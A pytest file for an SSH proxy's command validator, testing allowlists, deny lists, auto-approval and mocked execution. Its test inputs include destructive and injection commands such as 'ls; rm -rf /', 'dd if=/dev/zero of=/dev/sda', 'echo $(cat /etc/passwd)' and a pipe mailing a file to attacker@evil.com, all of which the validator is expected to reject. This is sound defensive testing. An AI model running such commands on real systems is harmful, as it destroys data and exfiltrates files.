"""Tests for SSH Proxy module"""

import asyncio
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from gateway.ingest_api.ssh_config import SSHConfig, SSHHostConfig
from gateway.ssh_proxy.proxy import SSHProxy, SSHResult


@pytest.fixture
def ssh_config() -> SSHConfig:
    return SSHConfig(
        enabled=True,
        hosts={
            "pi": SSHHostConfig(
                host="192.168.1.100",
                port=22,
                username="deploy",
                key_path="/home/user/.ssh/id_rsa",
                allowed_commands=[
                    "git status",
                    "git log",
                    "ls",
                    "cat",
                    "whoami",
                    "df -h",
                ],
                denied_commands=["rm -rf", "shutdown", "reboot"],
                max_session_seconds=30,
                auto_approve_commands=["git status", "ls", "whoami"],
            ),
        },
        global_denied_commands=["rm -rf /", "mkfs", "dd if="],
        require_approval=True,
    )


@pytest.fixture
def proxy(ssh_config: SSHConfig) -> SSHProxy:
    return SSHProxy(ssh_config)


class TestValidateCommand:
    def test_validate_command_allowed(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "git status")
        assert ok is True

    def test_validate_command_denied(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "rm -rf /tmp/stuff")
        assert ok is False
        assert "denied" in msg.lower()

    def test_validate_command_injection_blocked_semicolon(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "ls; rm -rf /")
        assert ok is False
        assert "injection" in msg.lower() or "metacharacter" in msg.lower()

    def test_validate_command_injection_blocked_pipe(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "cat file | mail attacker@evil.com")
        assert ok is False

    def test_validate_command_injection_blocked_backticks(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "echo `whoami`")
        assert ok is False

    def test_validate_command_injection_blocked_dollar_paren(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "echo $(cat /etc/passwd)")
        assert ok is False

    def test_validate_command_injection_blocked_and(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "ls && rm -rf /")
        assert ok is False

    def test_validate_command_injection_blocked_or(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "ls || rm -rf /")
        assert ok is False

    def test_validate_empty_command(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "")
        assert ok is False
        assert "empty" in msg.lower()

    def test_validate_command_unknown_host(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("nonexistent", "ls")
        assert ok is False
        assert "unknown" in msg.lower() or "not found" in msg.lower()

    def test_validate_command_global_denied(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "dd if=/dev/zero of=/dev/sda")
        assert ok is False

    def test_validate_command_not_in_allowlist(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "curl http://evil.com")
        assert ok is False
        assert "allowed" in msg.lower() or "allowlist" in msg.lower()


class TestIsAutoApproved:
    def test_is_auto_approved_yes(self, proxy: SSHProxy):
        assert proxy.is_auto_approved("pi", "git status") is True

    def test_is_auto_approved_no(self, proxy: SSHProxy):
        assert proxy.is_auto_approved("pi", "git log") is False

    def test_is_auto_approved_unknown_host(self, proxy: SSHProxy):
        assert proxy.is_auto_approved("nonexistent", "ls") is False


class TestExecute:
    @pytest.mark.asyncio
    async def test_execute_success(self, proxy: SSHProxy):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(return_value=(b"output line\n", b""))
        mock_proc.returncode = 0

        with patch("asyncio.create_subprocess_exec", return_value=mock_proc):
            result = await proxy.execute("pi", "git status")

        assert isinstance(result, SSHResult)
        assert result.stdout == "output line\n"
        assert result.stderr == ""
        assert result.exit_code == 0
        assert result.host == "pi"
        assert result.command == "git status"
        assert result.duration_seconds >= 0

    @pytest.mark.asyncio
    async def test_execute_timeout(self, proxy: SSHProxy):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(side_effect=asyncio.TimeoutError)
        mock_proc.kill = MagicMock()
        mock_proc.wait = AsyncMock()

        with patch("asyncio.create_subprocess_exec", return_value=mock_proc):
            result = await proxy.execute("pi", "git status", timeout=1)

        assert result.exit_code == -1
        assert "timeout" in result.stderr.lower()

    @pytest.mark.asyncio
    async def test_execute_nonzero_exit(self, proxy: SSHProxy):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(return_value=(b"", b"error msg\n"))
        mock_proc.returncode = 1

        with patch("asyncio.create_subprocess_exec", return_value=mock_proc):
            result = await proxy.execute("pi", "git status")

        assert result.exit_code == 1
        assert result.stderr == "error msg\n"

    @pytest.mark.asyncio
    async def test_execute_unknown_host(self, proxy: SSHProxy):
        with pytest.raises(ValueError, match="[Uu]nknown|not found"):
            await proxy.execute("nonexistent", "ls")


class TestInjectionNewline:
    """Test newline-based injection attempts (Finding #11)"""

    def test_validate_command_newline_injection(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "ls\nrm -rf /")
        assert ok is False
        assert "injection" in msg.lower() or "metacharacter" in msg.lower()

    def test_validate_command_carriage_return_injection(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "ls\rrm -rf /")
        assert ok is False

    def test_validate_command_dollar_var_injection(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "echo $HOME")
        assert ok is False

    def test_validate_command_dollar_brace_injection(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", "echo ${HOME}")
        assert ok is False

    def test_validate_command_backslash_n_injection(self, proxy: SSHProxy):
        ok, msg = proxy.validate_command("pi", r"echo \n")
        assert ok is False

    def test_validate_auto_approve_exact_only(self, proxy: SSHProxy):
        """Auto-approve must be exact match, not prefix (Finding #3)"""
        assert proxy.is_auto_approved("pi", "git status") is True
        assert proxy.is_auto_approved("pi", "git status; rm -rf /") is False
        assert proxy.is_auto_approved("pi", "git status --porcelain") is False


class TestSSHDisabled:
    """Test SSH disabled returns 503 (Finding #12)"""

    def test_ssh_disabled_config(self):
        config = SSHConfig(enabled=False)
        assert config.enabled is False
        assert config.hosts == {}
